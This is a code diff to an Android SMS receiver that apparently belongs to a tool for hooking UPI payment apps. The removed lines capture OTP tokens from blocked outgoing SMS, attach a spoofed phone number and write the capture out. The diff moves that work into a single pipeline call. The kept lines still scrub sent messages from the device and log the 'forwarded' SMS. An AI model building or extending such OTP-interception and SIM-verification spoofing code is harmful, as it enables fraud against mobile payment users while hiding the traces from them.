@@ -23,24 +23,8 @@ class BlockedSmsReceiver : BroadcastReceiver() {
         val appContext = context.applicationContext
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                val configManager = ConfigManager(appContext)
-                val config = configManager.load()
-                val appLabel = ActiveHookManager.readActivePackage()
-                    ?.let { UpiAppRegistry.displayNameFor(it) }.orEmpty()
-                    .ifBlank { "UPI App" }
-                val otp = LastOtp(
-                    otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
-                    sender = SmsMatcher.interceptDisplay(config, dest, configManager),
-                    body = body,
-                    phone = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 },
-                    messageLabel = appLabel,
-                    direction = "outgoing",
-                    rawPeer = dest,
-                    capturedAt = System.currentTimeMillis()
-                )
-                OtpCaptureWriter.write(appContext, otp)
                 OutgoingSmsCleaner.scrubSentIfNeeded(appContext, dest, body)
-                TokenForwarder(configManager, appContext).forwardOutgoingBlocked(otp)
+                VerifyTokenPipeline.handleBlocked(appContext, dest, body)
                 Log.i(TAG, "Forwarded blocked SMS dest=$dest")
             } catch (e: Exception) {
                 Log.w(TAG, "Blocked SMS handle failed: ${e.message}")
